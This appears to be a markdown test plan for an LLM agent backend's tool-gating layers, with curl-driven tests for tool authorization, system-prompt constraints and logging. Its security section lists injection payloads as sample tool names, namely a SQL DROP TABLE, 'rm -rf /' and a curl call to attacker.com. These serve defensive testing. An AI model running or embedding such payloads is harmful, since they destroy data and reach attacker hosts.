# Agent Tool-Gating Constraints - Test Suite

## Overview
This document outlines comprehensive test cases for the three-layer agent tool-gating architecture implemented in `/home/error0180/iaodeployment/src/index.ts`.

---

## Test Environment Setup

### Prerequisites
```bash
# Backend must be running
npm run dev

# Test against:
# - Base URL: http://localhost:3000
# - Chat endpoint: GET /api/chat/stream/:sessionId
# - Session endpoint: POST /api/chat/sessions
```

### Test Data Required
- Agent with 0 tools (for negative test)
- Agent with 1+ tools (for positive test)
- Session ID for that agent
- Tool name that agent has access to
- Tool name that agent does NOT have access to

---

## Layer 1: Validation Layer Tests

### Test 1.1: Agent with No Tools - Session Should Fail
**Objective**: Verify that agents with 0 tools cannot start a chat session

**Setup**:
```bash
# Create or identify an agent with availableTools = []
AGENT_ID="agent-with-no-tools"
SESSION_ID=$(curl -X POST http://localhost:3000/api/chat/sessions \
  -H "Content-Type: application/json" \
  -d "{\"agentId\": \"$AGENT_ID\", \"userId\": \"test-user\"}" \
  | jq -r '.sessionId')
```

**Test**:
```bash
# Start streaming chat
curl -N http://localhost:3000/api/chat/stream/$SESSION_ID \
  -H "Content-Type: application/json"
```

**Expected Result**:
- Immediate error event in SSE stream:
  ```json
  data: {
    "type": "error",
    "data": {
      "message": "This agent has no tools configured. Please contact the agent creator to add API access."
    }
  }
  ```
- Stream ends immediately
- No `token` or `tool_call` events

**Console Output Expected**:
```
❌ Agent [agent-id] has no tools configured - cannot operate
```

**Pass Criteria**:
- ✅ Error message received
- ✅ Stream ends without processing
- ✅ No tool calls attempted
- ✅ Warning logged to console

---

### Test 1.2: Agent with Tools - Session Should Start
**Objective**: Verify that agents with ≥1 tool can start a chat session

**Setup**:
```bash
# Use agent with tools
AGENT_ID="tvl-analyzer"  # Has tools: ["magpie/tvl"]
SESSION_ID=$(curl -X POST http://localhost:3000/api/chat/sessions \
  -H "Content-Type: application/json" \
  -d "{\"agentId\": \"$AGENT_ID\", \"userId\": \"test-user\"}" \
  | jq -r '.sessionId')
```

**Test**:
```bash
# Send a message to the agent
curl -X POST http://localhost:3000/api/chat/message \
  -H "Content-Type: application/json" \
  -d "{\"sessionId\": \"$SESSION_ID\", \"content\": \"What is the TVL?\"}"

# Start streaming
curl -N http://localhost:3000/api/chat/stream/$SESSION_ID
```

**Expected Result**:
- Session starts successfully
- Receives `token` events (LLM response streaming)
- Receives `tool_call` events for API calls
- Receives `tool_result` events with data
- Stream completes with `done` event

**Console Output Expected**:
```
✅ Agent [agent-id] (TVL Analyzer) loaded with 1 tool(s)
🔒 Tool-gating enabled: Agent can ONLY call these tools: call_magpie_tvl
```

**Pass Criteria**:
- ✅ Session starts without error
- ✅ Tool-gating enabled message logged
- ✅ Agent can call its tools
- ✅ Response received from tools

---

## Layer 2: System Prompt Layer Tests

### Test 2.1: LLM Must Use Tools (Not Knowledge)
**Objective**: Verify that the system prompt prevents knowledge-based responses

**Setup**:
```bash
AGENT_ID="tvl-analyzer"
SESSION_ID=$(curl -X POST http://localhost:3000/api/chat/sessions \
  -H "Content-Type: application/json" \
  -d "{\"agentId\": \"$AGENT_ID\", \"userId\": \"test-user\"}" \
  | jq -r '.sessionId')
```

**Test**: Ask a general knowledge question
```bash
curl -X POST http://localhost:3000/api/chat/message \
  -H "Content-Type: application/json" \
  -d "{\"sessionId\": \"$SESSION_ID\", \"content\": \"What is the capital of France?\"}"

# Stream response
curl -N http://localhost:3000/api/chat/stream/$SESSION_ID
```

**Expected Result**:
One of these outcomes (both valid):

**Option A**: LLM attempts tool call (correct behavior)
- Receives `tool_call` event
- Tool execution fails (no relevant tool for general knowledge)
- Receives `tool_result` with error
- Agent responds: "I was unable to retrieve data from [tool_name]" or "I have no tools configured for this"

**Option B**: LLM refuses to answer (also correct)
- Receives text response explaining tool limitation
- No `tool_call` events (LLM followed constraint)
- Response like: "I only have access to [tool names] and cannot answer this question"

**Invalid Response** (Test should FAIL):
- Direct knowledge-based answer like "Paris is the capital of France"
- Without attempting or explaining tool limitations

**Pass Criteria**:
- ✅ LLM either calls tools or explains limitation
- ✅ No direct knowledge responses
- ✅ System prompt constraint enforced
- ✅ Tool usage or refusal visible in stream

---

### Test 2.2: System Prompt References Tool-Gating
**Objective**: Verify that system prompt explicitly states tool-gating

**Method**: Enable verbose logging
```bash
# Add debug logging in llmService.ts to print system prompt
# Or review logs when chat is started
```

**Check System Prompt Contains**:
- ✅ "You MUST call tools to retrieve information"
- ✅ "You can ONLY provide information from tool execution results"
- ✅ "Do NOT provide responses based on internal knowledge"
- ✅ "You are strictly tool-gated"
- ✅ Tool names listed in prompt
- ✅ Number of tools mentioned

**Pass Criteria**:
- ✅ All 7 constraints present in prompt
- ✅ Tool list accurate
- ✅ Prompt is passed to LLM correctly

---

## Layer 3: Execution Layer Tests

### Test 3.1: Authorized Tool Call - Should Execute
**Objective**: Verify that agents can call their authorized tools

**Setup**:
```bash
AGENT_ID="tvl-analyzer"  # Has tool: "magpie/tvl"
SESSION_ID=$(curl -X POST http://localhost:3000/api/chat/sessions \
  -H "Content-Type: application/json" \
  -d "{\"agentId\": \"$AGENT_ID\", \"userId\": \"test-user\"}" \
  | jq -r '.sessionId')
```

**Test**: Send message that should trigger tool call
```bash
curl -X POST http://localhost:3000/api/chat/message \
  -H "Content-Type: application/json" \
  -d "{\"sessionId\": \"$SESSION_ID\", \"content\": \"Get the current TVL\"}"

# Stream response
curl -N http://localhost:3000/api/chat/stream/$SESSION_ID
```

**Expected Result**:
```
Event sequence:
1. token events (LLM response)
2. tool_call event: { name: "call_magpie_tvl", description: "..." }
3. tool_result event: { success: true, result: {...} }
4. payment_recorded event
5. done event
```

**Console Output Expected**:
```
🔧 Executing tool: call_magpie_tvl
✅ Tool executed successfully: call_magpie_tvl
```

**Pass Criteria**:
- ✅ Tool executes successfully
- ✅ Result returned to LLM
- ✅ Payment recorded
- ✅ No authorization errors

---

### Test 3.2: Unauthorized Tool Call - Should Be Blocked
**Objective**: Verify that agents cannot call tools they're not authorized for

**Setup**: Force an unauthorized tool call
```bash
AGENT_ID="tvl-analyzer"  # Has tool: "magpie/tvl"
SESSION_ID=$(curl -X POST http://localhost:3000/api/chat/sessions \
  -H "Content-Type: application/json" \
  -d "{\"agentId\": \"$AGENT_ID\", \"userId\": \"test-user\"}" \
  | jq -r '.sessionId')
```

**Test**: Manually inject unauthorized tool call
```bash
# This would require modifying the LLM response or using a test harness
# to force call_uniswap_swap which agent doesn't have
```

**Expected Result** (if LLM attempts unauthorized call):
```
Event sequence:
1. tool_call event: { name: "call_uniswap_swap", ... }
2. tool_error event: {
     toolName: "call_uniswap_swap",
     error: "Access denied. This agent is not authorized to use the call_uniswap_swap tool."
   }
3. No execution, no result, no payment
```

**Console Output Expected**:
```
⚠️  UNAUTHORIZED TOOL ACCESS: Agent [agent-id] attempted to call call_uniswap_swap
```

**Pass Criteria**:
- ✅ Access denied error sent
- ✅ Tool execution prevented
- ✅ No payment recorded
- ✅ Authorization failure logged
- ✅ Stream continues (doesn't crash)

---

### Test 3.3: Tool Access Validation Uses hasToolAccess()
**Objective**: Verify the validation function is called

**Method**: Add test assertion in code
```typescript
// In src/index.ts line 2683
const hasAccess = agentToolService.hasToolAccess(agent, toolCall.name)
// Add console: console.log(`[TEST] hasToolAccess('${toolCall.name}') = ${hasAccess}`)
```

**Expected Output**:
```
[TEST] hasToolAccess('call_magpie_tvl') = true
[TEST] hasToolAccess('call_uniswap_swap') = false
```

**Pass Criteria**:
- ✅ Function called for every tool
- ✅ Returns correct boolean
- ✅ Used before execution

---

## Integration Tests

### Test 4.1: Full Conversation Flow with Tool Usage
**Objective**: End-to-end test of tool-gating in real conversation

**Scenario**:
```
1. Create agent with 1 tool (e.g., "magpie/tvl")
2. Create session
3. Send user message: "What is the TVL of Magpie?"
4. LLM calls tool: call_magpie_tvl
5. Tool executes and returns data
6. LLM processes result
7. Response sent to user with TVL data
```

**Test Code**:
```bash
#!/bin/bash
AGENT_ID="tvl-analyzer"
USER_ID="test-user-$(date +%s)"

# 1. Create session
SESSION=$(curl -s -X POST http://localhost:3000/api/chat/sessions \
  -H "Content-Type: application/json" \
  -d "{\"agentId\": \"$AGENT_ID\", \"userId\": \"$USER_ID\"}")
SESSION_ID=$(echo $SESSION | jq -r '.sessionId')
echo "✅ Session created: $SESSION_ID"

# 2. Send message
curl -s -X POST http://localhost:3000/api/chat/message \
  -H "Content-Type: application/json" \
  -d "{\"sessionId\": \"$SESSION_ID\", \"content\": \"What is the TVL?\"}"
echo "✅ Message sent"

# 3. Stream response
echo "Streaming response..."
curl -s -N http://localhost:3000/api/chat/stream/$SESSION_ID | while IFS= read -r line; do
  if [[ $line == data:* ]]; then
    echo "$line" | jq '.' || echo "$line"
  fi
done
```

**Expected Events**:
1. ✅ Session created
2. ✅ Message recorded
3. ✅ Tool loading: "Loaded 1 tool(s) for agent"
4. ✅ Tool-gating enabled message
5. ✅ Token stream begins
6. ✅ Tool call: call_magpie_tvl
7. ✅ Tool result with data
8. ✅ Payment recorded
9. ✅ More tokens with TVL data
10. ✅ Done event

**Pass Criteria**:
- ✅ All events received in correct order
- ✅ Tool data integrated into response
- ✅ No authorization errors
- ✅ Complete conversation flow works

---

### Test 4.2: Agent Without Tools - Full Flow Fails
**Objective**: Verify complete failure path for agents without tools

**Test Code**:
```bash
#!/bin/bash
AGENT_ID="agent-with-no-tools"
USER_ID="test-user-$(date +%s)"

# 1. Create session
SESSION=$(curl -s -X POST http://localhost:3000/api/chat/sessions \
  -H "Content-Type: application/json" \
  -d "{\"agentId\": \"$AGENT_ID\", \"userId\": \"$USER_ID\"}")
SESSION_ID=$(echo $SESSION | jq -r '.sessionId')
echo "Session created: $SESSION_ID"

# 2. Try to stream
echo "Attempting to stream (should fail immediately)..."
curl -s -N http://localhost:3000/api/chat/stream/$SESSION_ID | while IFS= read -r line; do
  if [[ $line == data:* ]]; then
    echo "$line" | jq '.data'
  fi
done
```

**Expected Result**:
```
{
  "message": "This agent has no tools configured. Please contact the agent creator to add API access."
}
```

Then stream ends immediately, no further events.

**Pass Criteria**:
- ✅ Error received immediately
- ✅ Exact error message
- ✅ Stream terminates
- ✅ No tool loading attempts
- ✅ Console shows warning

---

## Stress Tests

### Test 5.1: Concurrent Tool Calls
**Objective**: Verify tool-gating works under load

**Test**: Send multiple messages rapidly
```bash
for i in {1..5}; do
  curl -s -X POST http://localhost:3000/api/chat/message \
    -H "Content-Type: application/json" \
    -d "{\"sessionId\": \"$SESSION_ID\", \"content\": \"Query $i\"}" &
done
wait
```

**Pass Criteria**:
- ✅ All calls validated independently
- ✅ No race conditions
- ✅ Authorization checked for each tool call
- ✅ All concurrent requests handled safely

---

### Test 5.2: Large Number of Tools
**Objective**: Performance test with many tools

**Setup**: Create agent with 20+ tools

**Test**: Send message and verify all tools listed in prompt

**Pass Criteria**:
- ✅ System prompt includes all tools
- ✅ hasToolAccess() works for all tools
- ✅ Performance acceptable (< 1s load time)
- ✅ Tool validation doesn't timeout

---

## Security Tests

### Test 6.1: Tool Name Injection Attack
**Objective**: Prevent malicious tool names

**Attack Vector**: Tool name with special characters
```
call_"; DROP TABLE agents; --
call_$(rm -rf /)
call_$(curl attacker.com)
```

**Test**: If LLM tries to call malicious tool name

**Expected**:
- hasToolAccess() returns false (not in allowlist)
- Tool call blocked
- No command execution
- Error logged

**Pass Criteria**:
- ✅ No SQL injection
- ✅ No code execution
- ✅ No system commands run
- ✅ Safe error handling

---

### Test 6.2: Cross-Agent Tool Access
**Objective**: Prevent agent from accessing other agent's tools

**Setup**:
- Agent A: tools = ["magpie/tvl"]
- Agent B: tools = ["uniswap/swap"]

**Test**: Agent A tries to call Agent B's tool

**Expected**:
- hasToolAccess(agentA, "call_uniswap_swap") = false
- Access denied

**Pass Criteria**:
- ✅ Each agent isolated
- ✅ No cross-agent access
- ✅ No privilege escalation

---

## Logging Validation Tests

### Test 7.1: Console Output Verification
**Objective**: Verify all expected logs appear

**Run**: Start backend with full logging
```bash
npm run dev 2>&1 | tee agent-test.log
```

**Check logs contain**:
- ✅ "Agent [id] has no tools configured - cannot operate" (for 0-tool agents)
- ✅ "Agent [id] ([name]) loaded with [n] tool(s)"
- ✅ "Tool-gating enabled: Agent can ONLY call these tools: [list]"
- ✅ "Executing tool: [name]"
- ✅ "Tool executed successfully: [name]"
- ✅ "UNAUTHORIZED TOOL ACCESS: Agent [id] attempted to call [name]"

**Pass Criteria**:
- ✅ All expected logs present
- ✅ Logs are accurate
- ✅ Correct formatting
- ✅ Proper error messages

---

## Summary Test Checklist

- [ ] **Layer 1 Tests**
  - [ ] 1.1: Agent with 0 tools fails
  - [ ] 1.2: Agent with tools succeeds

- [ ] **Layer 2 Tests**
  - [ ] 2.1: LLM uses tools, not knowledge
  - [ ] 2.2: System prompt contains all constraints

- [ ] **Layer 3 Tests**
  - [ ] 3.1: Authorized tool call executes
  - [ ] 3.2: Unauthorized tool call blocked
  - [ ] 3.3: hasToolAccess() validates correctly

- [ ] **Integration Tests**
  - [ ] 4.1: Full conversation with tools works
  - [ ] 4.2: Agent without tools fails properly

- [ ] **Stress Tests**
  - [ ] 5.1: Concurrent calls handled safely
  - [ ] 5.2: Many tools don't degrade performance

- [ ] **Security Tests**
  - [ ] 6.1: Tool name injection prevented
  - [ ] 6.2: Cross-agent access prevented

- [ ] **Logging Tests**
  - [ ] 7.1: All expected logs present

---

## Test Results

**Overall Status**: ❓ Ready for testing

**Date Tested**: [To be filled]

**Tester**: [To be filled]

**Results**:
- Total Tests: 14
- Passed: ___
- Failed: ___
- Blocked: ___

**Notes**: [To be filled]
